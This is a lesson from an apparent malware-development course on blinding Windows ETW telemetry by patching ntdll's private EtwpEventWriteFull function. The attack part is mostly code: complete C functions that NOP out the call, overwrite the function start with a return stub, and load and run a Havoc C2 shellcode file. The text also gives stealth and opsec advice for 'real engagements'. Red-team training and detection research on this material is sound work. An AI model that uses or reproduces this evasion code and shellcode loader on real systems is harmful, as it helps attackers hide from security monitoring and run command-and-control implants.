### Introduction

The previous module showed a simple function to patch `EtwEventWrite` and `EtwEventWriteFull` and `NtTraceEvent` to prevent events from reaching the ETW tracing session. This module will introduce another function that can be patched to achieve the same results.

### EtwpEventWriteFull

`EtwpEventWriteFull` is a private function called from within the `EtwEventWrite`, `EtwEventWriteEx`, and `EtwEventWriteFull` functions. To prove that these functions call `EtwpEventWriteFull`, they were analyzed using xdbg and the results are displayed in the following images.

**EtwEventWrite**

![Image](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-4-148666825-d3bf2f2d-85c0-4b09-973b-f6f67e01f8d5.png)

**EtwEventWriteEx**

![Image](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-4-248667046-f4114062-f617-4f30-9133-af2add221e8a.png)

**EtwEventWriteFull**

![Image](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-4-348666979-5981dfad-1f2b-435d-8005-e6c637dc809c.png)

The three functions shown in the images above simply prepare `EtwpEventWriteFull`'s parameters, before invoking it. Moreover, the `EtwpEventWriteFull` function is the one that calls the `NtTraceEvent` syscall to write the event into the ETW tracing session. This is verified through the following image taken from the IDA disassembler.

![Image](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-4-448671942-3c520495-683c-4406-b716-066fe4228f13.png)

Considering this, it is preferable to target the private `EtwpEventWriteFull` function instead of the other higher-level APIs. This module will present two approaches to patching the `EtwpEventWriteFull` function.

1. The first approach involves patching the `call !ntdll.EtwpEventWriteFull` instruction within the higher level WinAPIs, `EtwEventWrite` and `EtwEventWriteFull`.
    
2. The second method offers a more stealthy solution by directly patching the `EtwpEventWriteFull` function.
    

### Patching The Call To EtwpEventWriteFull

As previously mentioned, one way to block `EtwpEventWriteFull` from executing is by eliminating the `call` instruction responsible for invoking it. This instruction will be substituted with a `nop` instruction, which signifies a "no operation" and has no impact on the current state of the registers or stack.

However, it is necessary to clarify that only replacing the `call` instruction itself is not sufficient. It is also essential to patch the operand of the `call` instruction. If you require a refresher on assembly operands, revisit the _Introduction to MASM Assembly_ module. By patching the operand of the `call` instruction, the address specified in the instruction is overwritten, ensuring `call`'s operand is not mistakenly interpreted as an opcode for a different instruction.

A prerequisite to performing the patch is knowing the number of bytes that need to be overwritten. The previous images indicate that 5 bytes must be overwritten, which have the following format:

```
call XXXXXXXX
```

In this scenario, the operand of the `call` instruction represents an offset to the address of the `EtwpEventWriteFull` function. Considering that the opcode for the `call` instruction is one byte, and the accompanying address is four bytes, patching the `call EtwpEventWriteFull` instruction requires writing five `nop` instructions.

#### PatchEtwpEventWriteFullCall Function

The custom-built `PatchEtwpEventWriteFullCall` function applies the patch by completing the following steps:

1. Retrieve the address of the target function (either `EtwEventWrite` or `EtwEventWriteFull`) using the `GetProcAddress` WinAPI. Using `GetProcAddress` is not recommended in real engagements, but implementing an alternative will be left as an objective for this module.
    
2. Use the retrieved function's address to find the last `ret` instruction.
    
3. Begin searching in an upward direction, starting from the address of the `ret` instruction, for the `E8` opcode, which is the `call` instruction.
    
4. Retrieve the address of the first `call` instruction found.
    
5. Change the memory permissions of the specified address to allow writing. In this module, the memory permissions are set to `RWX`. This is an opsec fail and in real engagements `RWX` should be avoided and instead make use of `RW` and `RX`.
    
6. Write five `nop` instruction
    
7. Re-set the memory permissions to their original state.
    

The `PatchEtwpEventWriteFullCall` function's only required parameter is a `PATCH` enumeration that was introduced in the previous module. The `PATCH` enumeration determines what function `PatchEtwpEventWriteFullCall` will target, being either `EtwEventWrite` or `EtwEventWriteFull`. The `PATCH` enumeration is shown again below for convenience.

```c
typedef enum PATCH
{
	PATCH_ETW_EVENTWRITE,
	PATCH_ETW_EVENTWRITE_FULL
};
```

Whereas the `PatchEtwpEventWriteFullCall` function is shown below.

```c
#define x64_CALL_INSTRUCTION_OPCODE			0xE8		// 'call'	- instruction opcode
#define x64_RET_INSTRUCTION_OPCODE			0xC3		// 'ret'	- instruction opcode
#define x64_INT3_INSTRUCTION_OPCODE			0xCC		// 'int3'	- instruction opcode
#define NOP_INSTRUCTION_OPCODE				0x90		// 'nop'	- instruction opcode

#define PATCH_SIZE							0x05


BOOL PatchEtwpEventWriteFullCall(enum PATCH ePatch) {

	int			i               = 0;
	DWORD		dwOldProtection = 0x00;
	PBYTE		pEtwFuncAddress = NULL;

	// Get the address of "EtwEventWrite" OR "EtwEventWriteFull" based on 'ePatch'
	pEtwFuncAddress = GetProcAddress(GetModuleHandleA("NTDLL"), ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull");
	if (!pEtwFuncAddress) {
		printf("[!] GetProcAddress failed with error  %d \n", GetLastError());
		return FALSE;
	}

	// A while-loop to find the last 'ret' instruction
	while (1) {
		if (pEtwFuncAddress[i] == x64_RET_INSTRUCTION_OPCODE && pEtwFuncAddress[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
			break;
		i++;
	}

	// Searching upwards for the 'call' instruction
	while (i) {
		if (pEtwFuncAddress[i] == x64_CALL_INSTRUCTION_OPCODE) {
			pEtwFuncAddress = (PBYTE)&pEtwFuncAddress[i];
			break;
		}
		i--;
	}

	// If the first opcode is not 'call', return false
	if (pEtwFuncAddress != NULL && pEtwFuncAddress[0] != x64_CALL_INSTRUCTION_OPCODE)
		return FALSE;

	// Change memory permissions to RWX
	if (!VirtualProtect(pEtwFuncAddress, PATCH_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	// Apply the patch - Replacing the 'call EtwpEventWriteFull' with 0x90 instructions
	for (int j = 0; j < PATCH_SIZE; j++) {
		*(PBYTE)&pEtwFuncAddress[j] = NOP_INSTRUCTION_OPCODE;
	}

	// Change memory permissions to original
	if (!VirtualProtect(pEtwFuncAddress, PATCH_SIZE, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	return FALSE;
}
```

### Patching The Start of EtwpEventWriteFull

A more stealthy approach involves patching the `EtwpEventWriteFull` function directly. This approach is advantageous for two reasons: firstly, it applies a single patch rather than the previous solution which applies a patch on two functions. And secondly, there may be several other functions that invoke `EtwpEventWriteFull` besides `EtwEventWrite` and `EtwEventWriteFull`, all of which would have an unpatched `call EtwpEventWriteFull` instruction.

While the patch itself for `EtwpEventWriteFull` can be as straightforward as a `ret` instruction placed at the beginning of the function, the main difficulty lies in locating the address of the function. Since `EtwpEventWriteFull` is a private function that is not exported from the `ntdll.dll` module, obtaining its address presents a challenge. To find a solution, it is essential to understand how the `call` instruction operates when using an offset, which is the case when calling `EtwpEventWriteFull` from `EtwEventWrite`.

The following assembly code is extracted from the end of the `EtwEventWrite` function.

```
00007FFCC7C7FBE4 | E8 0F000000              | call <ntdll.EtwpEventWriteFull>                                   
00007FFCC7C7FBE9 | 48:83C4 58               | add rsp,58                                                       
00007FFCC7C7FBED | C3                       | ret                                                                
```

The hex value `0F000000` is the offset from the address `00007FFCC7C7FBE9` to the `EtwpEventWriteFull` function. However, it is important to note that the offset is in big-endian representation (recall _Module 23 - Payload Obfuscation - UUIDFuscation_), which means the actual offset is `0000000F`. To prove this, one can add `00007FFCC7C7FBE9` and `0F` together, resulting in the address `00007FFCC7C7FBF8`, which represents the address of the internal `EtwpEventWriteFull` function shown in the image below. Keep in mind that the offset to `EtwpEventWriteFull` starts from the instruction **after** the `call` instruction.

![](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-4-448766554-9594ea83-4f5c-479f-9c37-637e7702a618.png)

#### PatchEtwpEventWriteFullStart Function

The `PatchEtwpEventWriteFullStart` function modifies the beginning of the `EtwpEventWriteFull` function by inserting a shellcode consisting of `xor eax, eax` and `ret` instructions. This alteration causes `EtwpEventWriteFull` to return an `ERROR_SUCCESS` code without actually executing its original functionality.

`PatchEtwpEventWriteFullStart` also makes use of a helper function, `FetchEtwpEventWriteFull`, which is used to retrieve the address of `EtwpEventWriteFull`. The `FetchEtwpEventWriteFull` function uses a similar approach to the previously introduced `PatchEtwpEventWriteFullCall` function in order to locate the target `call EtwpEventWriteFull` instruction. It advances from the initial address by a total of five bytes, effectively bypassing `call EtwpEventWriteFull`'s opcode. Next, `FetchEtwpEventWriteFull` adds the offset to the current address, resulting in a calculated value that represents the address of `EtwpEventWriteFull`. This calculated value is then returned by the `FetchEtwpEventWriteFull` function.

```c
#define x64_CALL_INSTRUCTION_OPCODE			0xE8		// 'call'	- instruction opcode
#define x64_RET_INSTRUCTION_OPCODE			0xC3		// 'ret'	- instruction opcode
#define x64_INT3_INSTRUCTION_OPCODE			0xCC		// 'int3'	- instruction opcode


// Get the address of 'EtwpEventWriteFull'
PVOID FetchEtwpEventWriteFull() {

	INT		i				= 0;
	PBYTE	pEtwEventFunc	= NULL;
	DWORD	dwOffSet		= 0x00;

	// Both "EtwEventWrite" OR "EtwEventWriteFull" will work
	pEtwEventFunc = (PBYTE)GetProcAddress(GetModuleHandleA("NTDLL"), "EtwEventWrite");
	if (!pEtwEventFunc)
		return NULL;

	// A while-loop to find the last 'ret' instruction
	while (1) {
		if (pEtwEventFunc[i] == x64_RET_INSTRUCTION_OPCODE && pEtwEventFunc[i + 1] == x64_INT3_INSTRUCTION_OPCODE)
			break;
		i++;
	}

	// Searching upwards for the 'call' instruction
	while (i) {
		if (pEtwEventFunc[i] == x64_CALL_INSTRUCTION_OPCODE) {
			pEtwEventFunc = (PBYTE)&pEtwEventFunc[i];
			break;
		}
		i--;
	}

	// If the first opcode is not 'call', return null
	if (pEtwEventFunc != NULL && pEtwEventFunc[0] != x64_CALL_INSTRUCTION_OPCODE)
		return NULL;

	// Skipping the 'E8' byte ('call' opcode)
	pEtwEventFunc++;

	// Fetching EtwpEventWriteFull's offset
	dwOffSet = *(DWORD*)pEtwEventFunc;

	// Adding the size of the offset to reach the end of the call instruction
	pEtwEventFunc += sizeof(DWORD);

	// Adding the offset to the pointer reaching the address of 'EtwpEventWriteFull'
	pEtwEventFunc += dwOffSet;

	// pEtwEventFunc is now the address of EtwpEventWriteFull
	return (PVOID)pEtwEventFunc;
}



BOOL PatchEtwpEventWriteFullStart() {

	PVOID		pEtwpEventWriteFull = NULL;
	DWORD		dwOldProtection		= 0x00;
	BYTE		pShellcode[3]		= {
		0x33, 0xC0,			// xor eax, eax
		0xC3				// ret
	};

	// Getting EtwpEventWriteFull address
	pEtwpEventWriteFull = FetchEtwpEventWriteFull();
	if (!pEtwpEventWriteFull)
		return FALSE;

	// Change memory permissions to RWX
	if (!VirtualProtect(pEtwpEventWriteFull, sizeof(pShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] failed with error  %d \n", GetLastError());
		return FALSE;
	}

	// Apply the patch
	memcpy(pEtwpEventWriteFull, pShellcode, sizeof(pShellcode));

	// Change memory permissions to original
	if (!VirtualProtect(pEtwpEventWriteFull, sizeof(pShellcode), dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] failed with error  %d \n", GetLastError());
		return FALSE;
	}
	
	return TRUE;
}
```

### Demo

Patching the `call !ntdll.EtwpEventWriteFull` instruction from `EtwEventWrite`.

![](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-4-548779145-e868a8a9-b001-4a83-8631-bb50a78aac3b.png)

Patching the `call !ntdll.EtwpEventWriteFull` instruction from `EtwEventWriteFull`.

![](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-4-648779173-6050d571-b33a-4f57-a6a7-22699a9148db.png)

Patching the start of `EtwpEventWriteFull`.

![](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-4-748779219-bd0023c1-5cb9-450a-8272-75deda217081.png)![](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-4-848779289-5e1225f7-6043-4b2d-a457-983aaf79e752.png)

### Video Demo

Like the previous module, the video demo will again show the result of running this module's ETW evasion implementation against the `DotNetEtwConsumer` tool. The implementation uses `InjectShellcodeFileLocally` which will read and execute `demon.bin` in the local process memory.

The `demon.bin` file is a payload file generated using the Havoc C&C framework. Upon execution, it will open a session that will be used to execute a .NET assembly. The .NET assembly's execution will either be logged by the `DotNetEtwConsumer` tool, highlighting the technique's failure or success in bypassing ETW.

The .NET assembly executed in the demo is [SharpHound](https://github.com/BloodHoundAD/SharpHound) which is an open-source tool used for discovering misconfigurations in Active Directory.

`InjectShellcodeFileLocally` is shown below and requires one argument, `wsShellFileName`, which is the payload file to read (`demo.bin`).

```c

BOOL InjectShellcodeFileLocally(IN LPCWSTR wsShellFileName) {

	HANDLE	hFile					= INVALID_HANDLE_VALUE;
	DWORD	dwBufferSize			= NULL,
			dwNumberOfBytesRead		= NULL,
			dwOldProtection			= NULL;
	PBYTE	pBufferData				= NULL;

	BOOL	bResults				= FALSE;

	if ((hFile = CreateFileW(wsShellFileName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	if ((dwBufferSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	if ((pBufferData = VirtualAlloc(NULL, dwBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	if (!ReadFile(hFile, pBufferData, dwBufferSize, &dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != dwBufferSize) {
		printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
		printf("[!] Bytes Read: %d of %d\n", dwNumberOfBytesRead, dwBufferSize);
		goto _EndOfFunc;
	}

	if (!VirtualProtect(pBufferData, dwBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	printf("\t> Running Payload Via Thread ");
	DWORD	dwThreadId	= 0x00;
	HANDLE	hThread		= CreateThread(NULL, NULL, pBufferData, NULL, NULL, &dwThreadId);
	printf("[ %d ] ... \n", dwThreadId);
	if (hThread) {
		WaitForSingleObject(hThread, INFINITE);
	}

	bResults = TRUE;

_EndOfFunc:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return bResults;
}
```

The demo is shown below.

[![Video-Demo](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-4-demo-cover.png)](https://maldevacademy.s3.amazonaws.com/new/update-three/etw-4-demo.mp4)